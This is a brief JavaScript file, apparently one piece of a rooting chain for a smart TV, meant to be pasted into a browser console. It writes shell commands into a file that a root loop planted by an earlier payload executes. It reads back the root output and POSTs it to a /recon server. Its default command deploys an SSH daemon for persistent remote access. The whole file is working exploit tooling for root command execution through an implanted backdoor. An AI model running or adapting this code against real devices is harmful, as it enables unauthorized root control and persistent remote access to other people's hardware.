// run_root_cmd.js — paste into the TV recon page console.
// The root_loop.sh (started by the payload / HamService wrapper) executes
// /3rd_rw/appdata/root_cmd.sh and writes /3rd_rw/appdata/root_out.txt.
//
// Change CMD as needed. Examples:
//   "/bin/sh /3rd_rw/appdata/deploy_sshd.sh"
//   "id; cat /proc/self/status | grep -E '^(Uid|Gid|CapEff):'"
//   "/bin/sh /3rd_rw/appdata/verify.sh"
//   "/bin/sh /3rd_rw/appdata/rollback.sh"
(function(cmd){
  var o = {};
  o.write = HiBrowser.File.write("root_cmd.sh", cmd + "\n", 1);
  o.cmd = cmd;
  setTimeout(function(){
    var out = fileXHR("file:///3rd_rw/appdata/root_out.txt");
    o.out = out;
    console.log(out);
    fetch("/recon", {method:"POST", body:"ROOTOUT "+JSON.stringify(o)});
  }, 5000);
  return o;
})("/bin/sh /3rd_rw/appdata/deploy_sshd.sh");
